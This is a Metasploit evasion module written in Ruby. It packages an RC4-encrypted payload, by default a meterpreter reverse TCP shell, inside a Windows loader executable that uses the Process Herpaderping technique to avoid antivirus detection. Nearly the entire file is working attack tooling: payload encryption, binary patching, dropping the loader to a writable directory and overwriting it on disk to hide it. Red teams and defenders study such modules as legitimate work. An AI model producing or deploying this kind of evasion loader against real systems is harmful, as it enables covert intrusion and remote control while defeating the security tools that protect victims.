##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Evasion

  # These constants must match the constants defined in the PE loader code (ProcessHerpaderpingTemplate.cpp)
  MAX_JUNK_SIZE = 1024
  MAX_PAYLOAD_SIZE = 8192
  MAX_KEY_SIZE = 64

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Process Herpaderping evasion technique',
        'Description' => %q{
          This module allows you to generate a Windows executable that evades security
          products such as Windows Defender, Avast, etc. This uses the Process
          Herpaderping technique to bypass Antivirus detection. This method consists in
          obscuring the behavior of a running process by modifying the executable on disk
          after the image has been mapped in memory (more details https://jxy-s.github.io/herpaderping/).

          First, the chosen payload is encrypted and embedded in a loader Portable
          Executable (PE) file. This file is then included in the final executable. Once
          this executable is launched on the target, the loader PE is dropped on disk and
          executed, following the Process Herpaderping technique. Note that the name of
          the file that is being dropped is randomly generated. However, it is possible
          to configure the destination path from Metasploit (see WRITEABLE_DIR option
          description).

          Here is the main workflow:
          1. Retrieve the target name (where the PE loader will be dropped).
          2. Retrieve the PE loader from the binary and write it on disk.
          3. Create a section object and create a process from the mapped image.
          4. Modify the file content on disk by copying another (inoffensive) executable
          or by using random bytes (see REPLACED_WITH_FILE option description).
          5. Create the main Thread.

          The source code is based on Johnny Shaw's PoC (https://github.com/jxy-s/herpaderping).
        },
        'Author' => [
          'Johnny Shaw', # Research and PoC
          'Christophe De La Fuente' # MSF Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://jxy-s.github.io/herpaderping/' ],
          [ 'URL', 'https://github.com/jxy-s/herpaderping' ],
        ],
        'Platform' => 'windows',
        'Arch' => [ ARCH_X64, ARCH_X86 ],
        'Payload' => { 'ForceEncode' => true },
        'Targets' => [
          [
            'Microsoft Windows (x64)',
            {
              'Arch' => ARCH_X64,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Microsoft Windows (x86)',
            {
              'Arch' => ARCH_X86,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/meterpreter/reverse_tcp'
              }
            }
          ]
        ]
      )
    )

    register_options([
      OptString.new('ENCODER', [
        false,
        'A specific encoder to use (automatically selected if not set)',
        nil
      ]),
      OptString.new('WRITEABLE_DIR', [
        true,
        'Where to write the loader on disk',
        '%TEMP%'
      ]),
      OptString.new('REPLACED_WITH_FILE', [
        false,
        'File to replace the target with. If not set, the target file will be '\
          'filled with random bytes (WARNING! it is likely to be catched by AV).',
        '%SystemRoot%\\System32\\calc.exe'
      ])
    ])
  end

  def patch_binary(bin, tag, value)
    placeholder = bin.index(tag)
    unless placeholder
      fail_with(Failure::BadConfig, "Invalid source binary: missing \"#{tag}\" tag")
    end

    bin[placeholder, value.size] = value
    nil
  end

  def encrypt_payload
    opts = { format: 'rc4', key: rc4_key }
    junk = Rex::Text.rand_text(10..MAX_JUNK_SIZE)
    p = payload.encoded + junk
    vprint_status("Payload size: #{p.size} = #{payload.encoded.size} + #{junk.size} (junk)")
    Msf::Simple::Buffer.transform(p, 'raw', nil, opts)
  end

  def rc4_key
    @rc4_key ||= Rex::Text.rand_text_alpha(32..MAX_KEY_SIZE)
  end

  def run
    case target.arch.first
    when ARCH_X64
      arch_suffix = 'x64'
    when ARCH_X86
      arch_suffix = 'x86'
    end

    payload = generate_payload
    if payload.encoded.size > MAX_PAYLOAD_SIZE
      fail_with(Failure::BadConfig,
                "Payload too big: #{payload.encoded.size} bytes (max: #{MAX_PAYLOAD_SIZE})")
    end

    base_path = ::File.join(
      Msf::Config.data_directory,
      'evasion',
      'windows',
      'process_herpaderping'
    )
    exe_path = ::File.join(base_path, "ProcessHerpaderping_#{arch_suffix}.exe")
    exe_path = ::File.expand_path(exe_path)
    pe = File.read(exe_path)
    vprint_status("Using #{exe_path}")

    template_path = ::File.join(base_path, "ProcessHerpaderpingTemplate_#{arch_suffix}.exe")
    template_path = ::File.expand_path(template_path)
    payload_pe = File.read(template_path)
    vprint_status("Using #{template_path}")

    patch_binary(payload_pe, 'ENCKEY', rc4_key)

    vprint_status("RC4 key: #{rc4_key}")

    encrypted_payload = encrypt_payload
    vprint_status("Encrypted payload size: #{encrypted_payload.size}")

    size_prefix = [encrypted_payload.size].pack('L<')
    patch_binary(payload_pe, 'PAYLOAD', (size_prefix + encrypted_payload).b)
    vprint_status("Payload PE size #{payload_pe.size}")

    patch_binary(pe, 'PAYLOAD', payload_pe)

    target_file_name = Rex::Text.rand_text_alpha_lower(4..10)
    target_path = datastore['WRITEABLE_DIR']
    target_path << '\\' if target_path.last != '\\'
    target_path << target_file_name
    target_path << '.exe'
    patch_binary(pe, 'TARGETFILENAME', target_path.b)
    vprint_status("Target filename will be #{target_path}")

    replace_path = datastore['REPLACED_WITH_FILE']
    if replace_path.nil? || replace_path.empty?
      replace_path = "\0"
    end

    patch_binary(pe, 'REPLACEFILENAME', replace_path.b)

    file_create(pe)
    if arch_suffix == 'x86'
      print_warning(
        "#### WARNING ####\n"\
        "This payload won't work on 32-bit Windows 10 versions from 1511 (build\n"\
        "10586) to 1703 (build 15063), including Windows 10 2016 LTSB (build 14393).\n"\
        "These versions have a bug in the kernel that crashes/BugCheck the OS\n"\
        "when executing this payload. So, to avoid this, the payload won't run if\n"\
        'it detects the OS is one of these versions.'
      )
    end
  end
end
